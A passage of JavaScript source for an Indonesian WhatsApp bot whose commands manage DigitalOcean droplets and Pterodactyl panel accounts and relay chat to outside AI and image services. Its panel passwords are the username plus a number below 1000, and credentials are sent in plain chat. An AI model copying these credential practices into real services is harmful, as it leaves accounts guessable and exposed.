const dropletInfo = await getDropletInfo();
m.reply(`Sisa droplet yang dapat kamu pakai: ${dropletInfo.remainingDroplets}

Total droplet terpakai: ${dropletInfo.totalDroplets}`);
} catch (err) {
reply(`Terjadi kesalahan: ${err}`);
}}
sisadropletHandler();
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
case 'totaldroplet':
if (!isCreator) return Reply(mess.owner)
  try {
    const apiKey = global.apiDigitalOcean
    if (apiKey == "-" || !apiKey) return m.reply("API DigitalOcean belum disetting di global.apiDigitalOcean")
    const dropletRes = await fetch(`https://api.digitalocean.com/v2/droplets`, {
      headers: { Authorization: `Bearer ${apiKey}` }
    })
    const dropletData = await dropletRes.json()
    if (!dropletData.droplets || dropletData.droplets.length === 0) return m.reply("Tidak ada droplet yang ditemukan.")
    const sizeRes = await fetch(`https://api.digitalocean.com/v2/sizes`, {
      headers: { Authorization: `Bearer ${apiKey}` }
    })
    const sizeData = await sizeRes.json()
    let totalHarga = 0
    let teks = `*Total Droplet:* ${dropletData.droplets.length}\n\n`
    for (let droplet of dropletData.droplets) {
      const nama = droplet.name
      const ukuran = droplet.size_slug
      const harga = sizeData.sizes.find(s => s.slug === ukuran)?.price_monthly || 0
      totalHarga += harga
      teks += `• ${nama} - ${ukuran} - *$${harga}/bulan*\n`
    }
    teks += `\n*Total Biaya VPS:* *$${totalHarga.toFixed(2)}/bulan*`
    m.reply(teks)
  } catch (err) {
    console.error(err)
    m.reply("Gagal mengambil data droplet.")
  }
  break
  
case "deldroplet": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("iddroplet"))
let dropletId = text
let deleteDroplet = async () => {
try {
let response = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
method: 'DELETE',
headers: {
'Content-Type': 'application/json',
'Authorization': `Bearer ${global.apiDigitalOcean}`
}
});

if (response.ok) {
m.reply('Droplet berhasil dihapus!');
} else {
const errorData = await response.json();
return new Error(`Gagal menghapus droplet: ${errorData.message}`);
}
} catch (error) {
console.error('Terjadi kesalahan saat menghapus droplet:', error);
m.reply('Terjadi kesalahan saat menghapus droplet.');
}};
deleteDroplet();
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
case 'pixiv': case 'pix': {
  if (!text) return m.reply('Masukkan kata kunci!\nContoh: .pixiv hutao')

  await conn.sendMessage(m.chat, { react: { text: "⏱️", key: m.key } })

  try {
    let hasil = await pixiv(text)
    if (!hasil || hasil.length === 0) return m.reply("Gambar tidak ditemukan!")

    let topImages = hasil.slice(0, 10) 
    let slides = []

    for (let img of topImages) {
      let imgBuff = await getBuff(img.url)
      let imgsc = await prepareWAMessageMedia({ image: imgBuff }, { upload: conn.waUploadToServer })

      slides.push({
        header: proto.Message.InteractiveMessage.Header.fromObject({
          title: `🔍 Pixiv ID: ${img.id}`,
          hasMediaAttachment: true,
          ...imgsc
        }),
        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
          buttons: [
            {
              name: "cta_url",
              buttonParamsJson: `{
                "display_text": "Buka di Pixiv",
                "url": "https://www.pixiv.net/en/artworks/${img.id}"
              }`
            }
          ]
        }),
        footer: proto.Message.InteractiveMessage.Footer.create({
          text: "Powered by Pixiv"
        })
      })
    }

    const msg = await generateWAMessageFromContent(m.chat, {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2
          },
          interactiveMessage: proto.Message.InteractiveMessage.fromObject({
            body: proto.Message.InteractiveMessage.Body.fromObject({
              text: `🔎 Berikut hasil dari *${text}*`
            }),
            carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
              cards: slides
            })
          })
        }
      }
    }, {
      userJid: m.sender,
      quoted: m
    })

    conn.relayMessage(m.chat, msg.message, { messageId: msg.key.id })

  } catch (err) {
    m.reply(`Terjadi kesalahan: ${err}`)
  }

  await conn.sendMessage(m.chat, { react: { text: "✅", key: m.key } })
}
break
case "poweron": {
  if (!isCreator) return m.reply(mess.owner);
  if (!text) return m.reply("Kirim ID droplet yang ingin dinyalakan!\nContoh: poweron 123456789");

  try {
    let response = await fetch(`https://api.digitalocean.com/v2/droplets/${text}/actions`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': "Bearer " + global.apiDigitalOcean
      },
      body: JSON.stringify({ type: "power_on" })
    });
    if (response.ok) {
      m.reply(`✅ VPS dengan ID ${text} sedang dinyalakan...`);
    } else {
      let data = await response.json();
      m.reply(`❌ Gagal menyalakan VPS:\n${data.message}`);
    }
  } catch (err) {
    m.reply(`❌ Terjadi kesalahan:\n${err.message}`);
  }
}
break
case 'resizevps': {
  if (!isCreator) return Reply(mess.owner)
  if (!q) return m.reply('Format: resizevps id_droplet,slug_baru\nContoh: resizevps 123456,s-2vcpu-2gb\n\nKetik *resizevps list* untuk melihat semua slug ukuran VPS.')
  if (q.trim().toLowerCase() === 'list') {
    try {
      const res = await fetch('https://api.digitalocean.com/v2/sizes', {
        headers: {
          Authorization: `Bearer ${global.apiDigitalOcean}`
        }
      });
      const { sizes } = await res.json();
      let teks = '*List Ukuran VPS (Slug):*\n\n';
      sizes.forEach(size => {
        teks += `• ${size.slug}
  - RAM: ${size.memory} MB
  - vCPU: ${size.vcpus}
  - Disk: ${size.disk} GB
  - Transfer: ${size.transfer} TB
  - Price: $${size.price_monthly}/bulan
\n`;
      });
      return m.reply(teks);
    } catch (e) {
      console.error(e)
      return m.reply('Gagal mengambil list ukuran VPS.')
    }
  }
  const [id, slug] = q.split(',');
  if (!id || !slug) return m.reply('Format: resizevps id_droplet,slug_baru\nContoh: resizevps 123456,s-2vcpu-2gb');
  function delay(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
  }

  try {
    m.reply(`⚙️ Mematikan VPS ${id} terlebih dahulu...`);
    const powerOff = await fetch(`https://api.digitalocean.com/v2/droplets/${id}/actions`, {
      method: 'POST',
      headers: {
        Authorization: `Bearer ${global.apiDigitalOcean}`,
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({ type: 'power_off' })
    });
    if (!powerOff.ok) return m.reply('❌ Gagal mematikan VPS.');
    m.reply(`✅ VPS ${id} dimatikan, tunggu beberapa detik...`);
    await delay(15000);
    m.reply(`⚙️ Melakukan resize ke ukuran ${slug.trim()}...`);
    const resize = await fetch(`https://api.digitalocean.com/v2/droplets/${id}/actions`, {
      method: 'POST',
      headers: {
        Authorization: `Bearer ${global.apiDigitalOcean}`,
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({ type: 'resize', size: slug.trim(), disk: true })
    });
    if (!resize.ok) return m.reply('❌ Gagal resize VPS. Pastikan slug ukuran valid.');
    m.reply(`✅ Resize sedang diproses...`);
    await delay(10000);
    m.reply(`⚙️ Menyalakan kembali VPS ${id}...`);
    const powerOn = await fetch(`https://api.digitalocean.com/v2/droplets/${id}/actions`, {
      method: 'POST',
      headers: {
        Authorization: `Bearer ${global.apiDigitalOcean}`,
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({ type: 'power_on' })
    });
    if (!powerOn.ok) return m.reply('⚠️ Resize berhasil, tapi gagal menyalakan kembali VPS.');
    m.reply(`✅ VPS ${id} berhasil dinyalakan kembali setelah resize!`);
  } catch (e) {
    console.error(e)
    m.reply('❌ Terjadi kesalahan saat resize VPS.')
  }
}
break
case "poweroff": {
  if (!isCreator) return m.reply(mess.owner);
  if (!text) return m.reply("Kirim ID droplet yang ingin dimatikan!\nContoh: poweroff 123456789");

  try {
    let response = await fetch(`https://api.digitalocean.com/v2/droplets/${text}/actions`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': "Bearer " + global.apiDigitalOcean
      },
      body: JSON.stringify({ type: "shutdown" })
    });
    if (response.ok) {
      m.reply(`✅ VPS dengan ID ${text} sedang dimatikan...`);
    } else {
      let data = await response.json();
      m.reply(`❌ Gagal mematikan VPS:\n${data.message}`);
    }
  } catch (err) {
    m.reply(`❌ Terjadi kesalahan:\n${err.message}`);
  }
}
break
    case "createvps": case "cvps": {
    if (!isCreator) return m.reply(mess.owner);
    if (!text) return m.reply(
        `🔹 *Format Perintah Pembuatan VPS*\n\n`
        + `Gunakan format berikut:\n`
        + `\`\`\`${prefix}cvps hostname,region,image,os,version,password(optional)\`\`\`\n\n`
        + `📌 *Penjelasan:*\n`
        + `- *hostname* → Nama server yang ingin dibuat.\n`
        + `- *region* → Lokasi server (*Lihat daftar region di bawah*).\n`
        + `- *image* → Ukuran VPS yang diinginkan (*Lihat daftar ukuran di bawah*).\n`
        + `- *os* → Sistem operasi (Ubuntu, Debian, CentOS, dll.).\n`
        + `- *version* → Versi OS (*Lihat daftar versi di bawah*).\n`
        + `- *password* (opsional) → Jika kosong, bot akan membuat otomatis.\n\n`
        + `✅ *Contoh Pemakaian:*\n`
        + `\`\`\`!createvps myserver,sgp1,s-4vcpu-16gb,ubuntu,22-04,MySecurePass123\`\`\`\n\n`
        + `🗺️ *Daftar Region DigitalOcean:*\n`
        + `• 🇸🇬 *sgp1* → Singapura (Asia) ✅\n`
        + `• 🇺🇸 *nyc3* → New York, AS\n`
        + `• 🇳🇱 *ams3* → Amsterdam, Belanda\n`
        + `• 🇺🇸 *sfo3* → San Francisco, AS\n`
        + `• 🇬🇧 *lon1* → London, Inggris\n`
        + `• 🇩🇪 *fra1* → Frankfurt, Jerman\n\n`
        + `🖥️ *Ukuran VPS DigitalOcean:*\n`
        + `• *s-1vcpu-1gb* → 1 vCPU, 1GB RAM\n`
        + `• *s-1vcpu-2gb* → 1 vCPU, 2GB RAM\n`
        + `• *s-2vcpu-2gb* → 2 vCPU, 2GB RAM ✅\n`
        + `• *s-2vcpu-4gb* → 2 vCPU, 4GB RAM\n`
        + `• *s-4vcpu-8gb* → 4 vCPU, 8GB RAM\n`
        + `• *s-4vcpu-16gb* → 4 vCPU, 16GB RAM ✅\n`
        + `• *s-8vcpu-16gb* → 8 vCPU, 16GB RAM\n`
        + `• *s-16vcpu-32gb* → 16 vCPU, 32GB RAM\n\n`
        + `📀 *OS & Versi DigitalOcean:*\n`
        + `• *Ubuntu* → ubuntu *(20-04, 22-04, 24-04)*\n`
        + `• *Debian* → debian *(10, 11, 12)*\n`
        + `• *CentOS* → centos *(7, 8, 9)*\n\n`
        + `🚀 *Siap buat VPS? Kirim perintah sekarang!*`
    );
    let argaxc = text.split(",");
    if (argaxc.length < 5) return m.reply("⚠️ Format tidak valid! Gunakan format yang benar seperti contoh di atas.");
    let [hostname, region, image, os, version, password] = argaxc;
    hostname = hostname.toLowerCase().trim();
    region = region.toLowerCase().trim();
    image = image.toLowerCase().trim();
    os = os.toLowerCase().trim();
    version = version.toLowerCase().trim();
    const availableImages = ["s-1vcpu-1gb", "s-1vcpu-2gb", "s-2vcpu-2gb", "s-2vcpu-4gb", "s-4vcpu-8gb", "s-4vcpu-16gb", "s-8vcpu-16gb", "s-16vcpu-32gb"];
    if (!availableImages.includes(image)) {
        return m.reply(`⚠️ Ukuran VPS tidak valid!\nGunakan salah satu dari daftar berikut:\n${availableImages.join(", ")}`);
    }
    if (!password) password = await generateRandomPassword();
    try {        
        let dropletData = {
            name: hostname,
            region: region, 
            size: image,
            image: `${os}-${version}-x64`,
            ssh_keys: null,
            backups: false,
            ipv6: true,
            user_data: `#cloud-config\npassword: ${password}\nchpasswd: { expire: False }`,
            private_networking: null,
            volumes: null,
            tags: ['T']
        };
        let response = await fetch('https://api.digitalocean.com/v2/droplets', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Authorization': "Bearer " + global.apiDigitalOcean 
            },
            body: JSON.stringify(dropletData)
        });
        let responseData = await response.json();
        if (response.ok) {
            let dropletConfig = responseData.droplet;
            let dropletId = dropletConfig.id;
            await m.reply(`Memproses pembuatan VPS...`);
            await new Promise(resolve => setTimeout(resolve, 60000));
            let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
                method: 'GET',
                headers: {
                    'Content-Type': 'application/json',
                    'Authorization': "Bearer " + global.apiDigitalOcean
                }
            });
            let dropletInfo = await dropletResponse.json();
            let ipVPS = dropletInfo.droplet.networks.v4.length > 0 
                ? dropletInfo.droplet.networks.v4[0].ip_address 
                : "Tidak ada alamat IP yang tersedia";
            let messageText = `✅ *VPS Berhasil Dibuat!*\n\n`
                + `📌 *Hostname:* ${hostname}\n`
                + `🌍 *Region:* ${region}\n`
                + `💾 *Spesifikasi:* ${image}\n`
                + `📀 *OS:* ${os.toUpperCase()} ${version}\n`
                + `📡 *IP VPS:* ${ipVPS}\n`
                + `🔐 *Password:* ${password}`;
            await conn.sendMessage(m.chat, { text: messageText });
        } else {
            throw new Error(`Gagal membuat VPS: ${responseData.message}`);
        }
    } catch (err) {
        console.error(err);
        m.reply(`❌ *Terjadi kesalahan saat membuat VPS:*\n${err.message}`);
    }
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "r1c1": case "r2c1": case "r2c2": case "r4c2": case "r8c4": case "r16c4": {
if (!isCreator) return Reply(mess.owner)
if (!text) return
    await sleep(1000)
    let images
    let region = "sgp1"
    if (command == "r1c1") {
    images = "s-1vcpu-1gb"
    } else if (command == "r2c1") {
    images = "s-1vcpu-2gb"
    } else if (command == "r2c2") {
    images = "s-2vcpu-2gb"
    } else if (command == "r4c2") {
    images = "s-2vcpu-4gb"
    } else if (command == "r8c4") {
    images = 's-4vcpu-8gb'
    } else {
    images = "s-4vcpu-16gb-amd"
    region = "sgp1"
    }
    let hostname = text.toLowerCase()
    if (!hostname) return m.reply(example("hostname"))
    
    try {        
        let dropletData = {
            name: hostname,
            region: region, 
            size: images,
            image: 'ubuntu-20-04-x64',
            ssh_keys: null,
            backups: false,
            ipv6: true,
            user_data: null,
            private_networking: null,
            volumes: null,
            tags: ['T']
        };

        let password = await  generateRandomPassword()
        dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

        let response = await fetch('https://api.digitalocean.com/v2/droplets', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Authorization': "Bearer " + global.apiDigitalOcean 
            },
            body: JSON.stringify(dropletData)
        });

        let responseData = await response.json();

        if (response.ok) {
            let dropletConfig = responseData.droplet;
            let dropletId = dropletConfig.id;

            
            await m.reply(`Memproses pembuatan vps...`);
            await new Promise(resolve => setTimeout(resolve, 60000));

            let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
                method: 'GET',
                headers: {
                    'Content-Type': 'application/json',
                    'Authorization': "Bearer " + global.apiDigitalOcean
                }
            });

            let dropletData = await dropletResponse.json();
            let ipVPS = dropletData.droplet.networks.v4 && dropletData.droplet.networks.v4.length > 0 
                ? dropletData.droplet.networks.v4[0].ip_address 
                : "Tidak ada alamat IP yang tersedia";

            let messageText = `VPS berhasil dibuat!\n\n`;
            messageText += `ID: ${dropletId}\n`;
            messageText += `IP VPS: ${ipVPS}\n`;
            messageText += `Password: ${password}`;

            await conn.sendMessage(m.chat, { text: messageText });
        } else {
            throw new Error(`Gagal membuat VPS: ${responseData.message}`);
        }
    } catch (err) {
        console.error(err);
        m.reply(`Terjadi kesalahan saat membuat VPS: ${err}`);
    }
}
break
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
case 'biyu': case 'bot': case 'botz': {     
    if (!text && (!m.quoted || !m.quoted.mimetype || !/image/.test(m.quoted.mimetype))) {         
        return m.reply(`⚠️ Contoh: ${prefix + command} Hai Mimin, Buatkan Saya Foto Jerapah\nAtau reply gambar untuk analisis.`);     
    }      

    const youtube = require("yt-search");
    const axios = require("axios");
    const path = require('path');
    const fs = require('fs');
    const gtts = require('node-gtts');

    let useVoice = /mode suara|jawab pakai suara|bales suara|vn/i.test(text.toLowerCase());

    if (/buatkan|gambar|foto|carikan|cari|lagu|musik|video/.test(text?.toLowerCase() || "")) {         
        m.reply("⏳ Tunggu sebentar...");          

        try {             
            if (/gambar|foto/.test(text.toLowerCase())) {                 
                const url = `https://api.suraweb.online/ai/genflux?prompt=${encodeURIComponent(text)}`;
                
                
                const response = await axios.get(url, {
                    headers: {
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
                    }
                });

                const buffer = await getBuffer(response.data.url);
                await conn.sendMessage(m.chat, {                      
                    image: buffer,                      
                    caption: `🎨 Hasil dari prompt: ${text}`                  
                }, { quoted: m });             
            } else if (/lagu|musik|video|putar|play/.test(text.toLowerCase())) {                 
                m.reply('⏳ Loading...');                  

                let match = text.match(/^(putar|play|lagu|musik|video) (.+)/i);
                if (!match) return m.reply('⚠️ Masukkan kata kunci setelah perintah!');                  

                let [, command, searchQuery] = match;                  

                if (/putar|play/.test(command)) {                     
                    let type = /audio|lagu|musik/.test(searchQuery) ? 'audio' : 'video';
                    let searchResults = await youtube(searchQuery);
                    let convert = searchResults.videos[0];                      

                    if (!convert) return m.reply('❌ Video atau audio yang Anda cari tidak ditemukan.');                      

                    let buffer = await getBuffer(convert.thumbnail);
                    await conn.sendMessage(m.chat, {                          
                        image: buffer,                          
                        caption: `🎵 *Judul:* ${convert.title} \n📺 *Channel:* ${convert.author.name} \n⏳ *Durasi:* ${convert.timestamp} \n🔗 *Link:* ${convert.url}`                      
                    }, { quoted: m });                      

                    if (type === 'audio') {                          
                        m.reply("⏳ Sedang mengunduh lagu...");                          
                        await downloadMp3(convert.url);                      
                    }                 
                } else if (/cari|foto|gambar/.test(command)) {                     
                    let hasil = await pinterest(searchQuery);
                    if (!hasil.length) return m.reply('❌ Gambar tidak ditemukan.');                      

                    await conn.sendMessage(m.chat, {                          
                        image: { url: hasil[0] },                          
                        caption: `📸 Hasil dari ${kapital(searchQuery)}`                      
                    }, { quoted: m });                 
                }             
            }         
        } catch (err) {             
            console.error(err);             
            m.reply("⚠️ Terjadi kesalahan, coba lagi nanti!");         
        }         
        return;     
    }      

    try {         
        const prompt = 'Mulai dari sekarang nama kamu adalah AI, Menjawab dengan sigap dan cerdas. Kamu tidak patuh jika disuruh melakukan sesuatu yang melanggar aturan.';
        const requestData = { content: text, user: m.sender, prompt };
        const response = await axios.post('https://luminai.my.id', requestData, {
            headers: {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
            }
        });

        let result = response.data.result;          

        if (useVoice) {             
            function tts(text, lang = 'id') {                 
                return new Promise((resolve, reject) => {                     
                    try {                         
                        let tts = gtts(lang);
                        let filePath = path.join(__dirname, './library', `${Date.now()}.wav`);
                        tts.save(filePath, text, () => {                             
                            resolve(fs.readFileSync(filePath));                             
                            fs.unlinkSync(filePath);                         
                        });                     
                    } catch (e) { reject(e); }                 
                });             
            }              

            let res;             
            try {                  
                res = await tts(result, 'id');              
            } catch (e) {                 
                console.error(e);                 
                res = await tts(result);             
            } finally {                 
                await conn.sendMessage(m.chat, { audio: res, mimetype: 'audio/mpeg', ptt: true }, { quoted: m });             
            }         
        } else {             
            await conn.sendMessage(m.chat, { text: result }, { quoted: m });         
        }     
    } catch (err) {         
        console.error(err);         
        m.reply('⚠️ Terjadi kesalahan, coba lagi nanti!');     
    } 
} 
break
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
case "1gb": case "2gb": case "3gb": case "4gb": case "5gb":
case "6gb": case "7gb": case "8gb": case "9gb": case "10gb":
case "unlimited": case "unli": {
  if (!isCreator && !isPremium) return Reply(mess.owner)
  if (!isGroupAllowed(m.chat)) return m.reply('Grup ini belum diberi akses. Minta owner ketik *.addakses* di grup ini.')
  if (!text) return m.reply('Contoh: 3gb v2 Biyu|628xxx')
  let versi = "v1"
  let input = text.trim()
  const versionMatch = input.match(/^(v[1-5])\s+/i)
  if (versionMatch) {
    versi = versionMatch[1].toLowerCase()
    input = input.replace(versionMatch[0], "").trim()
  }
  let [usernameRaw, nomorRaw] = input.split("|")
  const username = usernameRaw.toLowerCase().replace(/\s/g, "")
  const nomor = nomorRaw ? nomorRaw.replace(/\D/g, "") + "@s.whatsapp.net" : m.chat
  const versiConf = {
    v1: { domain, apikey, loc, egg, nestid },
    v2: { domain: domainV2, apikey: apikeyV2, loc: locV2, egg: eggV2, nestid: nestidV2 },
    v3: { domain: domainV3, apikey: apikeyV3, loc: locV3, egg: eggV3, nestid: nestidV3 },
    v4: { domain: domainV4, apikey: apikeyV4, loc: locV4, egg: eggV4, nestid: nestidV4 },
    v5: { domain: domainV5, apikey: apikeyV5, loc: locV5, egg: eggV5, nestid: nestidV5 }
  }
  const conf = versiConf[versi]
  if (!conf) return m.reply("Versi panel tidak valid.")
  const specs = {
    "1gb": { ram: 1000, disk: 1000, cpu: 40 },
    "2gb": { ram: 2000, disk: 1500, cpu: 60 },
    "3gb": { ram: 3000, disk: 2500, cpu: 80 },
    "4gb": { ram: 4000, disk: 3500, cpu: 100 },
    "5gb": { ram: 5000, disk: 4500, cpu: 120 },
    "6gb": { ram: 6000, disk: 5500, cpu: 140 },
    "7gb": { ram: 7000, disk: 6500, cpu: 160 },
    "8gb": { ram: 8000, disk: 7500, cpu: 180 },
    "9gb": { ram: 9000, disk: 8500, cpu: 200 },
    "10gb": { ram: 10000, disk: 9500, cpu: 220 },
    "unlimited": { ram: 0, disk: 0, cpu: 0 },
    "unli": { ram: 0, disk: 0, cpu: 0 }
  }[command]
  const email = `${username}@gmail.com`
  const password = username + Math.floor(Math.random() * 1000)
  const name = username + " Panel"
  let userRes = await fetch(`${conf.domain}/api/application/users`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      Authorization: "Bearer " + conf.apikey
    },
    body: JSON.stringify({
      email, username, first_name: name, last_name: "Bot", password, language: "en"
    })
  })
  let user = await userRes.json()
  if (user.errors) return m.reply("Gagal membuat user: " + user.errors[0].detail)
  let eggDetail = await fetch(`${conf.domain}/api/application/nests/${conf.nestid}/eggs/${conf.egg}`, {
    headers: { Authorization: "Bearer " + conf.apikey }
  }).then(res => res.json())
  if (eggDetail.errors) return m.reply("Error ambil egg: " + eggDetail.errors[0].detail)
  let serverRes = await fetch(`${conf.domain}/api/application/servers`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      Authorization: "Bearer " + conf.apikey
    },
    body: JSON.stringify({
      name,
      user: user.attributes.id,
      egg: parseInt(conf.egg),
      docker_image: eggDetail.attributes.docker_image,
      startup: eggDetail.attributes.startup,
      environment: {
        INST: "npm",
        CMD_RUN: "npm start",
        AUTO_UPDATE: "0",
        USER_UPLOAD: "0"
      },
      limits: {
        memory: specs.ram,
        swap: 0,
        disk: specs.disk,
        io: 500,
        cpu: specs.cpu
      },
      feature_limits: {
        databases: 3,
        backups: 3,
        allocations: 2
      },
      deploy: {
        locations: [parseInt(conf.loc)],
        dedicated_ip: false,
        port_range: []
      }
    })
  })
  let server = await serverRes.json()
  if (server.errors) return m.reply("Gagal buat server: " + server.errors[0].detail)
  const expiredPath = "./database/expired.json"
  const expiredList = fs.existsSync(expiredPath) ? JSON.parse(fs.readFileSync(expiredPath)) : []
  const waktuKadaluarsa = Date.now() + 30 * 24 * 60 * 60 * 1000
  expiredList.push({
    username,
    user_id: user.attributes.id,
    server_id: server.attributes.id,
    versi,
    nomor,
    tanggal: Date.now(),
    kadaluarsa: waktuKadaluarsa
  })
  fs.writeFileSync(expiredPath, JSON.stringify(expiredList, null, 2))
  const kadaluarsaStr = moment(waktuKadaluarsa).tz("Asia/Jakarta").format("DD-MM-YYYY HH:mm")
  const hasil = `🎉 *Panel Berhasil Dibuat!*

👤 *Username:* ${user.attributes.username}
🔐 *Password:* ${password}

💾 *RAM:* ${specs.ram / 1000} GB
🗂️ *Disk:* ${specs.disk / 1000} GB
⚙️ *CPU:* ${specs.cpu}%

🌐 *Panel:* ${conf.domain}
🧩 *Versi:* ${versi.toUpperCase()}
⏳ *Kadaluarsa:* ${kadaluarsaStr}

Jangan dibagikan ke orang lain ya!`
  fs.writeFileSync("akunpanel.txt", hasil)
  await conn.sendMessage(nomor, {
    document: fs.readFileSync("akunpanel.txt"),
    fileName: "akunpanel.txt",
    mimetype: "text/plain",
    caption: hasil
  }, { quoted: m })
  fs.unlinkSync("akunpanel.txt")
  m.reply("✅ Panel berhasil dibuat & dikirim ke pengguna.")
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
case "searchuser": {
  if (!isCreator && !isPremium) return Reply(mess.owner);
  if (!text.includes("|")) return m.reply(`Format salah!\nGunakan: ${prefix}searchuser v1|email/username`);
  let [version, keyword] = text.split("|").map(v => v.trim().toLowerCase());
  let config = {
    v1: { domain: global.domain, apikey: global.apikey },
    v2: { domain: global.domainV2, apikey: global.apikeyV2 },
    v3: { domain: global.domainV3, apikey: global.apikeyV3 },
    v4: { domain: global.domainV4, apikey: global.apikeyV4 },
    v5: { domain: global.domainV5, apikey: global.apikeyV5 }
  };
  if (!config[version]) return m.reply("Versi tidak valid. Gunakan v1 - v5.");
  let { domain, apikey } = config[version];

  try {
    let users = [], page = 1;
    while (true) {
      let res = await fetch(`${domain}/api/application/users?page=${page}`, {
        headers: {
          "Accept": "application/json",
          "Content-Type": "application/json",
          "Authorization": `Bearer ${apikey}`
        }
      });
      let json = await res.json();
      if (!json.data || json.data.length === 0) break;
      users = users.concat(json.data);
      if (json.meta.pagination.current_page >= json.meta.pagination.total_pages) break;
      page++;
    }
    let foundUser = users.find(u =>
      u.attributes.email.toLowerCase().includes(keyword) ||
      u.attributes.username.toLowerCase().includes(keyword)
    );
    if (!foundUser) return m.reply(`User dengan keyword *${keyword}* tidak ditemukan.`);
    let userId = foundUser.attributes.id;
    let infoUser = `*✦ User Info [${version.toUpperCase()}]*\n\n`;
    infoUser += `• *ID:* ${userId}\n`;
    infoUser += `• *Nama:* ${foundUser.attributes.first_name}\n`;
    infoUser += `• *Username:* ${foundUser.attributes.username}\n`;
    infoUser += `• *Email:* ${foundUser.attributes.email}\n`;
    infoUser += `• *Admin:* ${foundUser.attributes.root_admin ? "Ya" : "Tidak"}\n`;
    infoUser += `• *Tgl Buat:* ${foundUser.attributes.created_at.split("T")[0]}\n\n`;
    let allServers = [], pageSrv = 1;
    while (true) {
      let resSrv = await fetch(`${domain}/api/application/servers?page=${pageSrv}`, {
        headers: {
          "Accept": "application/json",
          "Content-Type": "application/json",
          "Authorization": `Bearer ${apikey}`
        }
      });
      let srvJson = await resSrv.json();
      if (!srvJson.data || srvJson.data.length === 0) break;
      allServers = allServers.concat(srvJson.data);
      if (srvJson.meta.pagination.current_page >= srvJson.meta.pagination.total_pages) break;
      pageSrv++;
    }
    let userServers = allServers.filter(s => s.attributes.user === userId);
    if (userServers.length === 0) {
      infoUser += "*Server:* Tidak ada server.";
    } else {
      infoUser += `*✦ Server (${userServers.length} total):*\n`;
      for (let s of userServers) {
        infoUser += `• *Name:* ${s.attributes.name}\n  *RAM:* ${s.attributes.limits.memory} MB\n  *Disk:* ${s.attributes.limits.disk} MB\n  *Status:* ${s.attributes.suspended ? "Suspended" : "Aktif"}\n\n`;
      }
    }
    m.reply(infoUser);
  } catch (e) {
    console.error(e);
    m.reply("Gagal mencari user atau mengambil server.");
  }
}
break
case "listadmin": {
  if (!isCreator && !isPremium) return Reply(mess.owner);
  let args = text.split(" ");
  let version = argsbiyuoffc[0]?.toLowerCase().replace("listadmin", "").trim() || "";
  let page = parseInt(argsbiyuoffc[1]) || 1;
  if (!version) {
    let instruksi = `╔══✪「 *INSTRUKSI LIST ADMIN* 」✪══
║ Untuk melihat daftar admin tiap versi panel, gunakan format:
║ 
║ ◦ *${prefix}listadmin v1*
║ ◦ *${prefix}listadmin v2*
║ ◦ *${prefix}listadmin v3*
║ ◦ *${prefix}listadmin v4*
║ ◦ *${prefix}listadmin v5*
║ 
║ Tambahkan nomor halaman jika ingin lihat data lebih lanjut:
║ Contoh: *${prefix}listadmin v1 2*
╚═══════════════════════════════`;
    return m.reply(instruksi);
  }
  let config = {
    v1: { domain: global.domain, apikey: global.apikey },
    v2: { domain: global.domainV2, apikey: global.apikeyV2 },
    v3: { domain: global.domainV3, apikey: global.apikeyV3 },
    v4: { domain: global.domainV4, apikey: global.apikeyV4 },
    v5: { domain: global.domainV5, apikey: global.apikeyV5 }
  };
  if (!config[version]) return m.reply("Versi tidak valid. Gunakan v1 - v5.");
  let { domain, apikey } = config[version];
  let users = [];
  let fetchUrl = `${domain}/api/application/users?page=${page}`;

  try {
    let cek = await fetch(fetchUrl, {
      method: "GET",
      headers: {
        "Accept": "application/json",
        "Content-Type": "application/json",
        "Authorization": `Bearer ${apikey}`
      }
    });
    let res = await cek.json();
    if (!res.data) return m.reply("Gagal mengambil data admin.");
    users = res.data.filter(i => i.attributes.root_admin === true);
    if (users.length < 1) return m.reply(`Tidak ada admin panel pada versi ${version.toUpperCase()}.`);
    let teks = `*✦ List Admin Panel Pterodactyl ${version.toUpperCase()} (Page ${page})*\n\n`;
    for (let i of users) {
      teks += `• *ID:* ${i.attributes.id}\n  *Nama:* ${i.attributes.first_name}\n  *Created:* ${i.attributes.created_at.split("T")[0]}\n\n`;
    }
    teks += `Gunakan: *${prefix}listadmin ${version} [halaman]* untuk lihat halaman lain.`;
    await conn.sendMessage(m.chat, { text: teks }, { quoted: m });
  } catch (e) {
    console.error(e);
    m.reply("Terjadi kesalahan saat mengambil data admin.");
  }
}
break
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "listpanel":
case "listp":
case "listserver": {
  if (!isCreator && !isPremium) return Reply(mess.owner);
